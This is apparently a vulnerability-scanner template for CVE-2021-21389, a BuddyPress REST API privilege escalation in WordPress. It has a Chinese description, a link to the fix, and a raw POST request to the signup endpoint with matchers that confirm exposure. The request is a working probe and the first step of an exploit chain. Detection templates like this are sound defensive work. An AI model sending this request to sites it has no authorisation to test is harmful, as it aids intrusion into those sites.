id: CVE-2021-21389
info:
  name: BuddyPress REST API Privilege Escalation to RCE
  author:
  - l0ne1y
  description: |-
    WordPress Plugin BuddyPress 垂直越权漏洞
    WordPress是WordPress（Wordpress）基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    WordPress BuddyPress 7.2.1 存在安全漏洞，该漏洞源于非特权的普通用户可以通过利用REST API成员端点中的问题获得管理员权限。
  severity: critical
  remediation: |-
    官方修复方案:
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://buddypress.org/2021/03/buddypress-7-2-1-security-release/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/json
  - type: word
    condition: and
    part: body
    words:
    - user_login
    - registered
    - activation_key
    - user_email
  matchers-condition: and
  raw:
  - |
    POST /wp-json/buddypress/v1/signup HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json; charset=UTF-8

    {
      "user_login":"{{randstr}}",
      "password":"{{randstr}}",
      "user_name":"{{randstr}}",
      "user_email":"{{randstr}}@example.com"
    }
